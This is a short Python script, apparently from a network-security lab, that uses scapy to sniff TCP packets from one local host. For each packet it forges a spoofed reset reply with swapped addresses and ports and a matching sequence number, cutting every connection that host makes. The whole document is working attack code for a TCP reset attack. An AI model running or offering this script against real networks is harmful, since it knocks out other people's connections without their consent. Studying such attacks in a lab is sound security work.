#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="R", seq=pkt[TCP].ack)
    pkt = ip / tcp
    send(pkt, verbose=0)

sniff(filter="tcp and src host 192.168.86.21", prn=spoof_tcp)
